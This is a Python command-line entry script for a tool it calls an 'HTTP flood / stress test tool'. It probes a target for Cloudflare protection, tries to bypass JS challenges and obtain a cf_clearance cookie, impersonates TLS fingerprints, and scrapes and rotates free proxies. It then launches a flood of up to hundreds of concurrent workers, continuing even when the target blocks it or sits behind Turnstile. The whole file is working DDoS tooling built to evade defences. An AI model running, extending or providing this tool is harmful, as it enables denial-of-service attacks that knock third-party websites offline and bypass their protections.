import argparse
import asyncio
import sys

from core.cf_bypass import detect_protection, solve_js_challenge, make_session
from core.flooder import Flooder
from core.proxy_manager import ProxyManager


async def main():
    ap = argparse.ArgumentParser(description="HTTP flood / stress test tool")
    ap.add_argument("target")
    ap.add_argument("--proxies", help="File proxy list (host:port/line)")
    ap.add_argument("--method", default="GET", choices=["GET", "POST"])
    ap.add_argument("--threads", type=int, default=200)
    ap.add_argument("--duration", type=int, default=0, help="0 = until Ctrl+C")
    ap.add_argument("--rps-limit", type=int, default=0, help="Per-worker cap")
    ap.add_argument("--no-validate", action="store_true")
    ap.add_argument("--no-cf-bypass", action="store_true",
                    help="Use httpx instead of curl_cffi (no TLS impersonation)")
    ap.add_argument("--check-cf", action="store_true", help="Only probe protection")
    ap.add_argument("--validate-workers", type=int, default=150)
    args = ap.parse_args()

    # Pre-flight
    s = make_session()
    level = detect_protection(s, args.target)
    print(f"[*] Protection: {level}")

    if args.check_cf:
        return

    if level == "turnstile":
        print("[!] Target behind Turnstile. TLS impersonation will not solve it.")
        print("    Expect very low success rate. Proceeding anyway.")
    elif level == "js_challenge":
        print("[*] Attempting JS challenge bypass...")
        if solve_js_challenge(s, args.target):
            print("[+] cf_clearance obtained")
        else:
            print("[!] JS challenge not bypassed — many proxies will fail")
    elif level == "blocked":
        print("[!] Target returned 403/503, proceeding anyway")

    # Proxies
    pm = ProxyManager()
    if args.proxies:
        pm.load_from_file(args.proxies)
    else:
        await pm.scrape_free_proxies()

    if not args.no_validate:
        await pm.validate(workers=args.validate_workers)
        if not pm.proxies:
            print("[!] No healthy proxies.")
            sys.exit(1)

    flooder = Flooder(
        target=args.target, proxies=pm, method=args.method,
        threads=args.threads, use_cf_bypass=not args.no_cf_bypass,
        rps_limit=args.rps_limit,
    )
    print(f"[*] Flood: {args.threads} workers, method={args.method}")
    try:
        await flooder.run(duration=args.duration)
    except KeyboardInterrupt:
        flooder.stop()


if __name__ == "__main__":
    asyncio.run(main())